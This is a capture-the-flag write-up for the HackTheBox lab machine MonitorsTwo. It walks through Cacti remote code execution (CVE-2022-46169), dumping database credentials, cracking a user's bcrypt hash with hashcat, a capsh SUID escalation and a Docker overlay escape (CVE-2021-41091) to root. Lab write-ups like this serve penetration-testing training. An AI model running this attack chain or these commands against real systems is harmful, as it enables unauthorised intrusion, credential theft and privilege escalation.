# MonitorsTwo

<img src="../../.gitbook/assets/image.png" alt="" data-size="original">

nmap -sC -sV -vvv -Pn 10.10.11.211 | tee nmap.monitortwo

Discovered open port 22/tcp on 10.10.11.211

Discovered open port 80/tcp on 10.10.11.211



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Cacti Webpage</p></figcaption></figure>

* Checked if Cacti Version 1.2.22 is vulnerable to a vulnerability and found an exploit [CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
* This exploit allows unauthenticated Remote Code Execution on the machine.



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Exploit success + got a shell back</p></figcaption></figure>

Tried to search for user flag but couldnt find one, seems like we are in a Docker enviroment

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>Entrypoint and dockerenv</p></figcaption></figure>



{% code title="entrypoint.sh" overflow="wrap" %}
```sh
#!/bin/bas
set -ex


wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi


chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi


exec "$@"

h
```
{% endcode %}

* This shell file gives username and password for _MySQL_ which can allow us to get username and password for \`cacti\`.&#x20;



{% code overflow="wrap" %}
```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "show table

> "

+-------------------------------------+

| Tables_in_cacti           |

+-------------------------------------+

| aggregate_graph_templates      |

| aggregate_graph_templates_graph   |

| aggregate_graph_templates_item   |

| aggregate_graphs          |

| aggregate_graphs_graph_item     |

| aggregate_graphs_items       |

| automation_devices         |

| automation_graph_rule_items     |

| automation_graph_rules       |

| automation_ips           |

| automation_match_rule_items     |

| automation_networks         |

| automation_processes        |

| automation_snmp           |

| automation_snmp_items        |

| automation_templates        |

<----------SNIP-------------------------->

| snmpagent_managers         |

| snmpagent_managers_notifications  |

| snmpagent_mibs           |

| snmpagent_notifications_log     |

| user_auth              |

| user_auth_cache           |

| user_auth_group           |

| user_auth_group_members       |

| user_auth_group_perms        |

| user_auth_group_realm        |

| user_auth_perms           |

| user_auth_realm           |

| user_domains            |

| user_domains_ldap          |

| user_log              |

| vdef                |

| vdef_items             |

| version               |

+-------------------------------------+s
```
{% endcode %}

* _user\_auth_ may have credentials, so tried reading it.



{% code overflow="wrap" fullWidth="false" %}
```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth

+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

| id | username | password                           | realm | full_name   | email_address     | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |

+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

| 1 | admin  | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |   0 | Jamie Thompson | admin@monitorstwo.htb |           | on       | on    | on    | on      | on       |     2 |       1 |      1 |      1 |           1 | on   |     -1 |    -1 | -1        |    |        0 |    0 |  663348655 |

| 3 | guest  | 43e9a4ab75570f5b                       |   0 | Guest Account |            | on          | on       | on    | on    | on      | 3       |     1 |       1 |      1 |      1 |           1 |     |     -1 |    -1 | -1        |    |        0 |    0 |      0 |

| 4 | marcus  | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |   0 | Marcus Brune  | marcus@monitorstwo.htb |           |         | on    | on    | on      | on       |     1 |       1 |      1 |      1 |           1 | on   |     -1 |    -1 |         | on   |        0 |    0 | 2135691668 |

+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

```
{% endcode %}

Found Marcus hash which seems to be _bcrypt $2\*$, Blowfish (Unix)_.&#x20;

```
marcus  | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

```



{% code overflow="wrap" %}
```sh
hashcat -a 0 -m 3200 marcushash /usr/share/wordlists/rockyou.txt -w 3 -O -D 1,2
```
{% endcode %}

```
 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkeyw
```

* Log into the machine as marcus

```
ssh marcus@10.10.11.21

cat user.txt
```

* Checked for docker version.

```
marcus@monitorstwo:~$ docker -

 Docker version 20.10.5+dfsg1, build 55c4c88v
 
```

* &#x20;Checked for vulnerabilities and found an exploit. ([CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091))
* &#x20;Downloaded the exploit on marcus machine and execute it.

{% code overflow="wrap" %}
```sh
marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh

 [!] Vulnerable to CVE-2021-41091

 [!] Now connect to your Docker container that is accessible and obtain root access !

 [>] After gaining root access execute this command (chmod u+s /bin/bash)

 

 Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): 
```
{% endcode %}

* We need to gain root access on docker to start the exploit.
* &#x20;Searched for SUID and found capsh

{% code overflow="wrap" %}
```sh
www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/nul

 /usr/bin/gpasswd

 /usr/bin/passwd

 /usr/bin/chsh

 /usr/bin/chfn

 /usr/bin/newgrp

 /sbin/capsh

 /bin/mount

 /bin/umount

 /bin/sul
```
{% endcode %}

* Exploited it from [GTFOBINS](https://gtfobins.github.io/gtfobins/capsh/#suid)

```sh
www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --

Get a better shell
/usr/bin/script -qc /bin/bash /dev/null
```

* Give SUID permission to /bin/bash

```
root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
```

* Entered yes on the exploit on marcus machine.

{% code overflow="wrap" %}
```
marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh

 [!] Vulnerable to CVE-2021-41091

 [!] Now connect to your Docker container that is accessible and obtain root access !

 [>] After gaining root access execute this command (chmod u+s /bin/bash)

 

 Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes

 [!] Available Overlay2 Filesystems:

 /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged

 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

 

 [!] Iterating over the available Overlay2 filesystems !

 [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged

 [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

 

 [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

 [!] Rooted !

 [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

 [?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

 

 [!] Spawning Shell

 bash-5.1# exit 
```
{% endcode %}

* Moved to /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged .
* Found bash as SUID.

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -

 total 5596

 -rwsr-xr-x 1 root root 1234376 Mar 27 2022 bash

 -rwxr-xr-x 3 root root  38984 Jul 20 2020 bunzip2

 -rwxr-xr-x 3 root root  38984 Jul 20 2020 bzcat

 lrwxrwxrwx 1 root root      6 Jul 20 2020 bzcmp -> bzdiff

 -rwxr-xr-x 1 root root   2225 Jul 20 2020 bzdiff

 lrwxrwxrwx 1 root root      6 Jul 20 2020 bzegrep -> bzgrep

 -rwxr-xr-x 1 root root   4877 Sep 4 2019 bzexe

 lrwxrwxrwx 1 root root      6 Jul 20 2020 bzfgrep -> bzgrep

 -rwxr-xr-x 1 root root   3775 Jul 20 2020 bzgrep

 -rwxr-xr-x 3 root root  38984 Jul 20 2020 bzip2

 -rwxr-xr-x 1 root root  18424 Jul 20 2020 bzip2recover

 lrwxrwxrwx 1 root root      6 Jul 20 2020 bzless -> bzmore

 -rwxr-xr-x 1 root root   1297 Jul 20 2020 bzmore

 -rwxr-xr-x 1 root root  43936 Sep 24 2020 cat

 -rwxr-xr-x 1 root root  72672 Sep 24 2020 chgrp

 -rwxr-xr-x 1 root root  64448 Sep 24 2020 chmod

 -rwxr-xr-x 1 root root  72672 Sep 24 2020 chown

 -rwxr-xr-x 1 root root 151168 Sep 24 2020 cp

 -rwxr-xr-x 1 root root 125560 Dec 10 2020 dash

 -rwxr-xr-x 1 root root 113664 Sep 24 2020 date

 -rwxr-xr-x 1 root root  80968 Sep 24 2020 dd

 -rwxr-xr-x 1 root root  93936 Sep 24 2020 df

 -rwxr-xr-x 1 root root 147176 Sep 24 2020 dir

 -rwxr-xr-x 1 root root  84440 Jan 20 2022 dmesg

 lrwxrwxrwx 1 root root      8 Nov 7 2019 dnsdomainname -> hostname

 lrwxrwxrwx 1 root root      8 Nov 7 2019 domainname -> hostname

 -rwxr-xr-x 1 root root  39712 Sep 24 2020 echo

 -rwxr-xr-x 1 root root     28 Nov 9 2020 egrep

 -rwxr-xr-x 1 root root  39680 Sep 24 2020 false

 -rwxr-xr-x 1 root root     28 Nov 9 2020 fgrep

 -rwxr-xr-x 1 root root  69032 Jan 20 2022 findmnt

 -rwxr-xr-x 1 root root 203072 Nov 9 2020 grep

 -rwxr-xr-x 2 root root   2346 Apr 10 2022 gunzip

 -rwxr-xr-x 1 root root   6447 Apr 10 2022 gzexe

 -rwxr-xr-x 1 root root  98048 Apr 10 2022 gzip

 -rwxr-xr-x 1 root root  22600 Nov 7 2019 hostname

 -rwxr-xr-x 1 root root  30952 Apr 6 2021 kill

 -rwxr-xr-x 1 root root  72840 Sep 24 2020 ln

 -rwxr-xr-x 1 root root  56952 Feb 7 2020 login

 -rwxr-xr-x 1 root root 147176 Sep 24 2020 ls

 -rwxr-xr-x 1 root root 149736 Jan 20 2022 lsblk

 -rwxr-xr-x 1 root root  85184 Sep 24 2020 mkdir

 -rwxr-xr-x 1 root root  76896 Sep 24 2020 mknod

 -rwxr-xr-x 1 root root  48064 Sep 24 2020 mktemp

 -rwxr-xr-x 1 root root  59632 Jan 20 2022 more

 -rwsr-xr-x 1 root root  55528 Jan 20 2022 mount

 -rwxr-xr-x 1 root root  18664 Jan 20 2022 mountpoint

 -rwxr-xr-x 1 root root 147080 Sep 24 2020 mv

 lrwxrwxrwx 1 root root      8 Nov 7 2019 nisdomainname -> hostname

 lrwxrwxrwx 1 root root     14 Dec 16 2021 pidof -> /sbin/killall5

 -rwxr-xr-x 1 root root 137680 Apr 6 2021 ps

 -rwxr-xr-x 1 root root  43872 Sep 24 2020 pwd

 lrwxrwxrwx 1 root root      4 Mar 27 2022 rbash -> bash

 -rwxr-xr-x 1 root root  52032 Sep 24 2020 readlink

 -rwxr-xr-x 1 root root  72704 Sep 24 2020 rm

 -rwxr-xr-x 1 root root  52032 Sep 24 2020 rmdir

 -rwxr-xr-x 1 root root  27472 Sep 27 2020 run-parts

 -rwxr-xr-x 1 root root 122224 Dec 22 2018 sed

 lrwxrwxrwx 1 root root      4 Nov 14 2022 sh -> dash

 -rwxr-xr-x 1 root root  43808 Sep 24 2020 sleep

 -rwxr-xr-x 1 root root  84928 Sep 24 2020 stty

 -rwsr-xr-x 1 root root  71912 Jan 20 2022 su

 -rwxr-xr-x 1 root root  39744 Sep 24 2020 sync

 -rwxr-xr-x 1 root root 531928 Feb 17 2021 tar

 -rwxr-xr-x 1 root root  14456 Sep 27 2020 tempfile

 -rwxr-xr-x 1 root root 101408 Sep 24 2020 touch

 -rwxr-xr-x 1 root root  39680 Sep 24 2020 true

 -rwsr-xr-x 1 root root  35040 Jan 20 2022 umount

 -rwxr-xr-x 1 root root  39744 Sep 24 2020 uname

 -rwxr-xr-x 2 root root   2346 Apr 10 2022 uncompress

 -rwxr-xr-x 1 root root 147176 Sep 24 2020 vdir

 -rwxr-xr-x 1 root root  63744 Jan 20 2022 wdctl

 lrwxrwxrwx 1 root root      8 Nov 7 2019 ypdomainname -> hostname

 -rwxr-xr-x 1 root root   1984 Apr 10 2022 zcat

 -rwxr-xr-x 1 root root   1678 Apr 10 2022 zcmp

 -rwxr-xr-x 1 root root   5898 Apr 10 2022 zdiff

 -rwxr-xr-x 1 root root     29 Apr 10 2022 zegrep

 -rwxr-xr-x 1 root root     29 Apr 10 2022 zfgrep

 -rwxr-xr-x 1 root root   2081 Apr 10 2022 zforce

 -rwxr-xr-x 1 root root   8049 Apr 10 2022 zgrep

 -rwxr-xr-x 1 root root   2206 Apr 10 2022 zless

 -rwxr-xr-x 1 root root   1842 Apr 10 2022 zmore

 -rwxr-xr-x 1 root root   4577 Apr 10 2022 znewl
```
{% endcode %}

* Executed ./bash -p and got root on the main machine.

```
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -

 bash-5.1# whoami

 root
```
